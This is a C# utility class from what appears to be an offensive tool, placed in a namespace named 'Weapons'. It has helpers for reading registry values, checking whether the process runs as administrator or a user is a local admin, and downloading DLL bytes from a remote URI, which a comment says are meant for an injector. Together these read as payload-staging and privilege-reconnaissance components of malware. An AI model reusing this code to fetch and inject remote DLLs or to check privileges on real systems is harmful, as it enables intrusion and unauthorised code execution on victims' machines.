using Microsoft.Win32;
using System;
using System.DirectoryServices.AccountManagement;
using System.IO;
using System.Net;
using System.Security.Principal;

namespace Weapons
{
    class W_Utils
    {

        public static string GetRegValue(string hive, string path, string value)
        {
            string regKeyValue = "";
            if (hive == "HKCU")
            {
                var regKey = Registry.CurrentUser.OpenSubKey(path);
                if (regKey != null)
                {
                    regKeyValue = String.Format("{0}", regKey.GetValue(value));
                }
                return regKeyValue;
            }
            else if (hive == "HKU")
            {
                var regKey = Registry.Users.OpenSubKey(path);
                if (regKey != null)
                {
                    regKeyValue = String.Format("{0}", regKey.GetValue(value));
                }
                return regKeyValue;
            }
            else
            {
                var regKey = Registry.LocalMachine.OpenSubKey(path);
                if (regKey != null)
                {
                    regKeyValue = String.Format("{0}", regKey.GetValue(value));
                }
                return regKeyValue;
            }
        }

        public static bool IsHighIntegrity()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static bool IsLocalAdmin(string userName)
        {

            PrincipalContext ctx = new PrincipalContext(ContextType.Machine);
            UserPrincipal usr = UserPrincipal.FindByIdentity(ctx, IdentityType.SamAccountName, userName);

            foreach (Principal p in usr.GetAuthorizationGroups())
            {
                if (p.ToString() == "Administrators")
                {
                    return true;
                }
            }
            return false;
        }

        // Get Bytes From Injector DLL target
        public static byte[] GetDLLBytes(string uri)
        {
            byte[] output = null;
            
            try
            {
                MemoryStream content = new MemoryStream();

                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uri);
                request.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;

                using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                using (Stream stream = response.GetResponseStream())
                {
                    int bufferSize = 16384;
                    byte[] buffer = new byte[bufferSize];
                    int bytesRead = 0;
                    
                    while ((bytesRead = stream.Read(buffer, 0, bufferSize)) != 0)
                    {
                        content.Write(buffer, 0, bytesRead);
                    }
                }

                output = content.ToArray();
                content.Close();
            }
            catch
            {
                return new byte[0];
            }

            return output;
        }

        // check if Input string is in base64 format
        private static bool IsBase64(string base64String)
        {
            if (string.IsNullOrEmpty(base64String) || base64String.Length % 4 != 0
               || base64String.Contains(" ") || base64String.Contains("\t") || base64String.Contains("\r") || base64String.Contains("\n"))
                return false;

            try
            {
                Convert.FromBase64String(base64String);
                return true;
            }
            catch (Exception exception)
            {
                return false;
            }
        }
    }
}